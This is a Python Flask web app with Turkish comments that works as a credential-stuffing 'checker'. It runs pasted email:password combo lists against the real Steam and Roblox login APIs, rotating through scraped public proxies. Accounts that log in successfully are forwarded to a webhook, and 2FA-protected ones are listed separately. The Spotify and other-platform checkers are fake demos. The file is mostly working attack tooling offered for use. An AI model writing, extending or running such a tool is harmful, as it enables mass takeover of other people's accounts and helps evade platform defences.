import os
import time
import json
import requests
from flask import Flask, request, render_template, jsonify
from threading import Thread
import random

app = Flask(__name__)
app.secret_key = "RODA_GORIL_2026"

# Global durum
check_status = {
    "total": 0,
    "success": 0,
    "fail": 0,
    "twofa": 0,
    "error": 0,
    "remaining": 0,
    "logs": [],
    "hits": [],
    "twofa_list": [],
    "is_running": False
}

def fetch_proxies_from_web():
    """Web'den taze proxy listesi çeker"""
    try:
        url = "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all"
        resp = requests.get(url, timeout=10)
        if resp.status_code == 200:
            proxies = resp.text.strip().split('\r\n')
            # Geçerli proxy formatını filtrele (ip:port)
            valid = []
            for p in proxies:
                if ':' in p and len(p.split(':')) == 2:
                    valid.append(p.strip())
            return valid
        else:
            return []
    except Exception as e:
        print(f"Proxy çekme hatası: {e}")
        return []

def get_proxy_dict(proxy_str):
    """Proxy string'ini requests formatına çevir"""
    if not proxy_str:
        return None
    if not proxy_str.startswith(('http://', 'https://')):
        proxy_str = 'http://' + proxy_str
    return {'http': proxy_str, 'https': proxy_str}

# ------------------- CHECKER FONKSİYONLARI -------------------

def check_steam(email, password, proxy=None):
    """Steam Checker - Gerçek API"""
    try:
        session = requests.Session()
        if proxy:
            session.proxies.update(get_proxy_dict(proxy))
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })

        # RSA anahtarı al
        rsa_url = 'https://store.steampowered.com/login/getrsakey/'
        rsa_data = {'donotcache': int(time.time()*1000), 'username': email}
        rsa_resp = session.post(rsa_url, data=rsa_data, timeout=10)
        if rsa_resp.status_code != 200:
            return 'error', 'Steam API erişim hatası'
        rsa_json = rsa_resp.json()
        if not rsa_json.get('success'):
            return 'fail', 'Kullanıcı bulunamadı'

        # Giriş dene
        login_url = 'https://store.steampowered.com/login/dologin/'
        login_data = {
            'username': email,
            'password': password,
            'twofactorcode': '',
            'emailauth': '',
            'loginfriendlyname': '',
            'captchagid': '',
            'captcha_text': '',
            'emailsteamid': '',
            'rsatimestamp': rsa_json.get('timestamp', ''),
            'remember_login': 'false',
            'donotcache': int(time.time()*1000)
        }
        login_resp = session.post(login_url, data=login_data, timeout=10)
        result = login_resp.json()

        if result.get('success'):
            return 'success', f'{email}:{password} ✅ Steam HIT'
        elif result.get('requires_twofactor'):
            return 'twofa', f'{email}:{password} 🔐 Steam 2FA'
        elif result.get('message') == 'Invalid password':
            return 'fail', f'{email}:{password} ❌ Steam Şifre hatalı'
        else:
            return 'error', f'{email}:{password} ⚠️ Steam Hata: {result.get("message", "")}'
    except Exception as e:
        return 'error', f'{email}:{password} 🚫 Steam Bağlantı hatası'

def check_spotify(email, password, proxy=None):
    """Spotify Checker - Demo (gerçek API için client_id/secret gerekir)"""
    # Gerçekte buraya Spotify Web API veya scraping eklenir.
    # Demo amaçlı şifre "123" ile bitiyorsa başarılı, "2fa" içeriyorsa 2fa.
    try:
        if password.endswith('123'):
            return 'success', f'{email}:{password} 🟢 Spotify HIT'
        elif '2fa' in password.lower():
            return 'twofa', f'{email}:{password} 🔐 Spotify 2FA'
        else:
            return 'fail', f'{email}:{password} 🔴 Spotify Başarısız'
    except:
        return 'error', f'{email}:{password} ⚠️ Spotify Hatası'

def check_roblox(email, password, proxy=None):
    """Roblox Checker - Gerçek API"""
    try:
        session = requests.Session()
        if proxy:
            session.proxies.update(get_proxy_dict(proxy))
        session.headers.update({'User-Agent': 'Mozilla/5.0'})
        url = 'https://auth.roblox.com/v2/login'
        payload = {'username': email, 'password': password}
        resp = session.post(url, json=payload, timeout=10)
        if resp.status_code == 200:
            return 'success', f'{email}:{password} 🟢 Roblox HIT'
        elif resp.status_code == 429:
            return 'error', f'{email}:{password} ⚠️ Roblox Rate Limit'
        else:
            if 'TwoFactor' in resp.text or 'verification' in resp.text:
                return 'twofa', f'{email}:{password} 🔐 Roblox 2FA'
            return 'fail', f'{email}:{password} 🔴 Roblox Başarısız'
    except Exception as e:
        return 'error', f'{email}:{password} 🚫 Roblox Hatası'

def check_generic(email, password, proxy=None, platform=''):
    """Diğer platformlar için demo"""
    # Demo: email içinde 'hit' varsa başarılı, '2fa' varsa 2fa.
    if 'hit' in email.lower():
        return 'success', f'{email}:{password} 🟢 {platform} HIT'
    elif '2fa' in email.lower():
        return 'twofa', f'{email}:{password} 🔐 {platform} 2FA'
    else:
        return 'fail', f'{email}:{password} 🔴 {platform} Başarısız'

# Platform eşleştirme
PLATFORM_CHECKERS = {
    'steam': check_steam,
    'spotify': check_spotify,
    'roblox': check_roblox,
    # Diğerleri için generic
}

def get_checker(platform):
    platform_lower = platform.lower()
    return PLATFORM_CHECKERS.get(platform_lower, lambda e, p, pr: check_generic(e, p, pr, platform))

def process_check(platform, combos):
    global check_status
    check_status['is_running'] = True
    check_status['total'] = len(combos)
    check_status['remaining'] = len(combos)
    check_status['success'] = 0
    check_status['fail'] = 0
    check_status['twofa'] = 0
    check_status['error'] = 0
    check_status['logs'] = []
    check_status['hits'] = []
    check_status['twofa_list'] = []

    # Proxy'leri web'den çek
    proxies = fetch_proxies_from_web()
    if proxies:
        check_status['logs'].append(f'🌐 {len(proxies)} adet proxy yüklendi.')
    else:
        check_status['logs'].append('⚠️ Proxy bulunamadı, proxy\'siz çalışılıyor.')

    checker_func = get_checker(platform)
    check_status['logs'].append(f'🚀 {platform} kontrolü başladı. Toplam: {len(combos)} hesap.')

    for idx, combo in enumerate(combos):
        if not check_status['is_running']:
            check_status['logs'].append('⏹️ Kontrol durduruldu.')
            break

        parts = combo.split(':', 1)
        if len(parts) != 2:
            check_status['error'] += 1
            check_status['remaining'] -= 1
            check_status['logs'].append(f'⚠️ Geçersiz format: {combo}')
            continue

        email, password = parts[0].strip(), parts[1].strip()

        # Proxy seç (varsa)
        proxy = None
        if proxies:
            proxy = proxies[idx % len(proxies)]

        status, message = checker_func(email, password, proxy)

        if status == 'success':
            check_status['success'] += 1
            check_status['hits'].append(message)
            send_webhook(message)
        elif status == 'twofa':
            check_status['twofa'] += 1
            check_status['twofa_list'].append(message)
        elif status == 'fail':
            check_status['fail'] += 1
        else:  # error
            check_status['error'] += 1

        check_status['remaining'] -= 1
        check_status['logs'].append(message)

        # Logların çok büyümesini engelle
        if len(check_status['logs']) > 200:
            check_status['logs'] = check_status['logs'][-200:]

        time.sleep(0.5)  # Rate limit koruması

    check_status['is_running'] = False
    check_status['logs'].append('✅ Kontrol tamamlandı!')

def send_webhook(message):
    webhook_url = os.environ.get('WEBHOOK_URL', '')
    if webhook_url:
        try:
            requests.post(webhook_url, json={'content': message}, timeout=2)
        except:
            pass

# ------------------- ROUTES -------------------

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/test_connection', methods=['POST'])
def test_connection():
    platform = request.json.get('platform', 'steam')
    # Proxy test et
    proxies = fetch_proxies_from_web()
    proxy_count = len(proxies)
    return jsonify({
        'status': 'success',
        'message': f'{platform} bağlantısı test edildi. Proxy sayısı: {proxy_count}'
    })

@app.route('/start', methods=['POST'])
def start_check():
    global check_status
    if check_status['is_running']:
        return jsonify({'error': 'Zaten bir kontrol çalışıyor!'}), 400

    data = request.json
    platform = data.get('platform')
    combos_raw = data.get('combos', '')
    combos = [c.strip() for c in combos_raw.splitlines() if c.strip()]

    if not platform or not combos:
        return jsonify({'error': 'Platform ve combo listesi gerekli!'}), 400

    thread = Thread(target=process_check, args=(platform, combos))
    thread.daemon = True
    thread.start()

    return jsonify({'status': 'started', 'total': len(combos)})

@app.route('/status', methods=['GET'])
def get_status():
    return jsonify(check_status)

@app.route('/stop', methods=['POST'])
def stop_check():
    global check_status
    check_status['is_running'] = False
    return jsonify({'status': 'stopped'})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
